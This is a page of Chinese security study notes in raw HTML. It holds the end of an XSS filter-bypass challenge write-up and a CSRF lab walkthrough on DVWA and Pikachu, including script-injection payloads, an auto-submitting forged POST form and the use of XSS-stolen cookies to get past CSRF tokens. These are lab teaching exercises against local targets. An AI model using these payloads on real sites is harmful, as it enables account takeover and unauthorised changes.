<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120202706.png)</p>
<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><p>过滤了圆括号（）  反引号 `<br> 用<svg>标签中可以直接执行实体字符</p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120203328.png)</p>
<h5 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h5><p>这里使用!-->闭合</p>
<p><code>!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120203548.png)</p>
<h5 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h5><p>​        过滤以auto开头或者on开头，=等号结尾的标签属性并替换成下划线_ , 且忽略大小写，虽然看起来好像无解了。但是这里我们可以通过换行来绕过正则的检查，看源码写的type=“text”<br> 是文本格式无法执行，我们用type=“image”绕过 </p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204137.png)</p>
<h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><p>\w+:多个 英文字母或数字或下划线组成的<br> /?: 0个或1个/<br> g: 全局匹配<br> i: 不区分大小写</p>
<p>这里过滤了<多个字母或数字> 也就是说 <a>, </a> <111> 全部替换成空，可以用低优先级来解决去掉末尾的></p>
<pre><code>&lt;body onload=&quot;alert(1)&quot;</code></pre><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204654.png)</p>
<h5 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h5><p>​      代码中将</style>标签替换成/ u574Fu4EBA /，且忽略大小写；正则的目的在于防止我们闭合<style>标签，但是这里我们依然可以通过换行绕过正则进行闭合。</p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204809.png)</p>
<h5 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h5><p>代码要求我们以<a href="https://www.segmentfault.com开头，输入点是在" target="_blank" rel="noopener">https://www.segmentfault.com开头，输入点是在</a><>标签中，我们可以用</script>闭合前面 在后面加注释绕过</p>
<p><code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code></p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120205401.png)</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/csrf-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/csrf-lou-dong-xue-xi/" itemprop="url">CSRF+SSRF漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:26:02+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">web漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="CSRF漏洞-SSRF漏洞笔记-靶场实战"><a href="#CSRF漏洞-SSRF漏洞笔记-靶场实战" class="headerlink" title="CSRF漏洞+SSRF漏洞笔记+靶场实战"></a>CSRF漏洞+SSRF漏洞笔记+靶场实战</h2><h3 id="CSRF漏洞部分"><a href="#CSRF漏洞部分" class="headerlink" title="CSRF漏洞部分"></a>CSRF漏洞部分</h3><h4 id="CSRF简述"><a href="#CSRF简述" class="headerlink" title="CSRF简述"></a>CSRF简述</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​    CSRF攻击建立在浏览器和Web服务器的对话之中，并且能欺骗用户访问url，发起的目标是通过伪造的用户请求，该请求不是用户想发出去的请求，对服务器或服务来说，该请求是完全合法的请求，但却完成了攻击者的期望操作。</p>
<p>​    从代码上看，CSRF能攻击成功是攻击者猜到了你重要参数，因而伪造请求。</p>
<p>​    可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的账户</p>
<p><strong>浏览器Cookie机制：</strong></p>
<p>cookie的两种表现形式：一种是本地Cookie，又称持久性Cookie；</p>
<p>　　　　　　　　　　  一种是临时Cookie，又称Session Cookie；：</p>
<h5 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h5><p>1.攻击者必须在目标站点找到一个表单的提交入口，或者有类似的URL(例如用来转钱，修改受害者邮箱或者密码)</p>
<p>2.目标站点不能有检测referer头操作，或者被攻击者的浏览器允许referer欺骗</p>
<p>3.攻击者必须了解表单或者URL参数中的正确的值，如果有秘密验证值或者ID，攻击者没有猜对，攻击者很可能不成功。</p>
<p>4。攻击者必须诱使受害者访问有恶意代码的页面，并且此时受害者已经登录到目标站点。</p>
<h5 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h5><ul>
<li>有意义的操作（如修改密码）</li>
<li>验证过于简单（参数固定、我们可以设置参数）</li>
</ul>
<p><strong>漏洞类型</strong></p>
<ul>
<li>GET型</li>
<li>POST型</li>
</ul>
<h5 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h5><p>1.手工检测：抓包查看是否存在无token无referer验证这种情况。存在的话就会有CSRF漏洞</p>
<p>​                       如果存在无token有referer验证这种情况时，我们可以尝试空referer绕过或者尝试抓包伪造referer  </p>
<p>2.半自动检测：常用半自动检测漏洞的软件有CSRFTester,CSRF Request Builder等。</p>
<h5 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h5><p><strong>1、自动化扫描工具</strong></p>
<p>netspark</p>
<p>AWVS</p>
<p>appscan</p>
<p>一般用上列工具可以扫描到网站是否存在CSRF漏洞。但是在工具中添加登录参数可以大大提高挖掘的成功率</p>
<p><strong>2、半自动检测工具</strong></p>
<p>CSRFTester</p>
<p>下载地址：<a href="https://www.owasp.org/index.php/File:CSRFTester-1.0.zip" target="_blank" rel="noopener">https://www.owasp.org/index.php/File:CSRFTester-1.0.zip</a></p>
<p>1.安装CSRFTester</p>
<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/1.jpg" alt="1.jpg"></p>
<p>打开run.bat就可以打开工具，但是需要java的环境</p>
<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/2-1024x622.jpg" alt="2.jpg">)<img src="https://www.secpulse.com/wp-content/uploads/2018/11/21-1024x622.jpg" alt="2.jpg"></p>
<p>消息框出现该消息时，表示工具已经开始监听本地8008这个端口了，这个时候需要配置浏览器的代理</p>
<p>\2. 设置浏览器代理（搜狗浏览器为例）</p>
<p>点击工具栏–代理设置–添加新代理，将代理进行添加并启用即可</p>
<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/3-1024x584.png" alt="3.png"></p>
<p>\3. 用户登录</p>
<p>单击“Start Recording”，开启CSRFTester的检测工作，这样以后我们所有访问的URL以及参数都会被记录下来。</p>
<p>\4. 通过CSRFTester抓取和伪造请求</p>
<p>当你登录一个网站账号时，CSRF Tester会进行抓取</p>
<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/9.png" alt="9.png"></p>
<p>我们抓取了该请求，在Step属性中添加请求，然后将Form Parameter中的user等表单中参数进行修改，然后单击Generate HTML按钮（可以选择其他格式：Forms、IFrame等）来产生CSRF攻击脚本。</p>
<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/10-1024x659.png" alt="10.png"></p>
<p>随机生成了一个攻击脚本，将其上传服务器，发送给受害者即可。</p>
<p>CSRF PoC generator</p>
<p>打开burpsuite，在抓取任意一个HTTP请求中点击右键，选择Engagement tools，然后点击Generate CSRF POC即可生成CSRF POC，</p>
<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/8-1024x822.png" alt="8.png">)<img src="https://www.secpulse.com/wp-content/themes/secpulse2017/js/editor/themes/default/images/spacer.gif" alt="img"></p>
<p>这款工具也是根据请求参数生成的POC，可以直接点击test in browser按钮进行测试，点击后会利用这段POC进行攻击。</p>
<p>上列两款工具可以拦截所有的请求，渗透测试人员可以在登录状态下进行修改密码、删除文件等操作，工具便会将发送的请求进行拦截，再通过工具生成的POC便可以验证漏洞是否存在。</p>
<p>1.CSRFTester设置浏览器代理:127.0.0.1:8008，bp是8080</p>
<p>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞</p>
<p>3.生成POC<br>一个wordpress博客为例就存在一个CSRF漏洞<br>创建用户，bp抓包，修改添加用户的账号密码<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190802112041-81ebadd4-b4d4-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190802112041-81ebadd4-b4d4-1.png" alt="img"></a><br>发送到CSRF POC<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190802112102-8e91ff5c-b4d4-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190802112102-8e91ff5c-b4d4-1.png" alt="img"></a><br>以html形式保存下来，发送给目标用户欺骗他打开，成功创建一个新账户<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190802112122-9a57c2f4-b4d4-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190802112122-9a57c2f4-b4d4-1.png" alt="img"></a></p>
<h5 id="常见的防御方法："><a href="#常见的防御方法：" class="headerlink" title="常见的防御方法："></a>常见的防御方法：</h5><ul>
<li><p><strong>使用验证码：</strong></p>
<p>验证码强制用户必须和应用进行交互，才能完成最终的请求</p>
</li>
<li><p><strong>验证HTTP referer字段：</strong></p>
<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p>
</li>
<li><p><strong>在请求地址中添加token并验证：</strong></p>
<p>在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
</li>
</ul>
<h4 id="DVWA（CSRF部分）"><a href="#DVWA（CSRF部分）" class="headerlink" title="DVWA（CSRF部分）"></a>DVWA（CSRF部分）</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple:"></a>simple:</h5><img src="QQ截图20200123184231.png" style="zoom:50%;" />

<p><strong>分析：</strong></p>
<p>​      我们分析源代码可知，服务器收到修改密码的请求后，会检查参数password_new password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制，所以我们只需要用户在cookie还有效的时间内在相同的浏览器访问我们给定的url（该操作是服务器对请求的发送者进行了身份验证，检查cookie），就可以实现CSRF攻击，修改用户密码。</p>
<p><strong>漏洞利用</strong></p>
<p>我们可以构造如下URL进行修改密码：</p>
<p><a href="http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#" target="_blank" rel="noopener">http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#</a></p>
<p>我们构造一个html表单提交页面</p>
<img src="QQ截图20200128112112.png" style="zoom:67%;" />

<p>将html文件放入本地网站的根目录下。</p>
<p>我们尝试在本地访问该网页</p>
<img src="QQ截图20200128112036.png" style="zoom:50%;" />



<p>点击后发现跳转到了DVWA更改密码界面，密码被修改</p>
<img src="QQ截图20200128112051.png" style="zoom:67%;" />



<h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Checks to see where the request came from</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// Get input</span>
        <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// Do the passwords match?</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">// They do!</span>
            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment" spellcheck="true">// Update the database</span>
            <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> <span class="token punctuation">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"';"</span><span class="token punctuation">;</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment" spellcheck="true">// Feedback for the user</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">// Issue with passwords matching</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Passwords did not match.&lt;/pre>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// Didn't come from a trusted source</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>That request didn't look correct.&lt;/pre>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span> </code></pre>
<p><strong>分析：</strong></p>
<p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击</p>
<p><strong>漏洞利用：</strong></p>
<p>我们用burp对数据进行抓包，不断对referer进行修改，最后发现referer需包含我们host名</p>
<img src="QQ截图20200128112923.png" style="zoom: 67%;" />





<p>查阅资料了解到referer参数和链接相同，我们可以将Html文件名中包含127.0.0.1,比如将html文件修改为</p>
<p>127.0.0.1.html</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128113629.png" alt=""></p>
<p>我们在浏览器打开127.0.0.1.html，点击submit</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128113414.png" alt=""></p>
<p>我们发现密码成功修改。</p>
<p><strong>high</strong></p>
<p>high等级我们发现在url中多了user_token,并且每次修改密码user_token都随着变化</p>
<p>usr_token的职责：它的职责是保护用户的用户名及密码多次提交，以防密码泄露。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128114230.png" alt=""></p>
<p>如果该页面不存在XSS漏洞时，此方法就可以有效杜绝CSRF漏洞</p>
<p>但我们可以通过利用DVWA的XSS漏洞进行有效利用</p>
<p><strong>利用过程</strong></p>
<p>我们首先利用dvwa的XSS漏洞获取浏览器cookie.</p>
<img src="QQ截图20200128114910.png" style="zoom:50%;" />

<p>然后我们回到构造好的CSRF页面提交用Burp进行抓包</p>
<img src="QQ截图20200128115317.png" style="zoom:67%;" />

<p>我们使用获取到的cookie进行替换，然后发包即可成功修改密码。</p>
<p><strong>impossibe</strong></p>
<img src="QQ截图20200128120628.png" style="zoom:50%;" />

<p>它提示了要输入原始密码，这就保证了当前用户一定是本人，有效的确保了CSRF攻击。</p>
<h4 id="Pikachu平台-CSRF部分）"><a href="#Pikachu平台-CSRF部分）" class="headerlink" title="Pikachu平台(CSRF部分）"></a>Pikachu平台(CSRF部分）</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200129173327.png" alt=""></p>
<h5 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h5><p>我们首先根据右上角的提示登录账号</p>
<img src="QQ截图20200129173354.png" style="zoom:50%;" />





<img src="QQ截图20200129173746.png" style="zoom:67%;" />



<p>我们选择修改个人信息并用burp抓包</p>
<img src="QQ截图20200129173928.png" style="zoom:80%;" />

<p>提交的请求来看，后台没做CSRF token，同时也是通过GET请求来提交修改信息，我们拿到这个请求，伪造一个请求链接，然后让kobe点击就好，我们构造的URL中把地址add改为hack。kobe一点击就修改了地址。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200129174206.png" alt=""></p>
<h5 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h5><p>POST型，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击。</p>
<p>这里的攻击方式跟XSS中POST类型是一样的，攻击者可以搭建一个站点，在站点上做一个表单，诱导lucy点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p>
<p>我们编写一个自动提交表单的html文件：</p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
window<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.171.133/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>girl<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>12345678922<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hacker<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lucy@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p>​      下面把页面的URL发送给受害者，只要受害者一点击这个链接，就会自动往服务器发送POST请求，修改地址信息。</p>
<h5 id="CSRF（token"><a href="#CSRF（token" class="headerlink" title="CSRF（token)"></a>CSRF（token)</h5><p> CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造</p>
<ul>
<li><p>每次请求，都增加一个随机码(需要够随机，不容易被伪造），后台每次对这个随机码进行验证</p>
<p>我们进入Pikachu平台的CSRF（token）页面并登录，我们可以看一下这个GET请求</p>
</li>
</ul>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200203172940.png" alt=""></p>
<p>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了</p>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7297" target="_blank" rel="noopener">https://xz.aliyun.com/t/7297</a></p>
<p><a href="https://xz.aliyun.com/t/240" target="_blank" rel="noopener">https://xz.aliyun.com/t/240</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1472698" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1472698</a></p>
<p><a href="https://blog.csdn.net/SKI_12/article/details/60477557" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/60477557</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/ti-quan-fang-shi-zong-jie/">

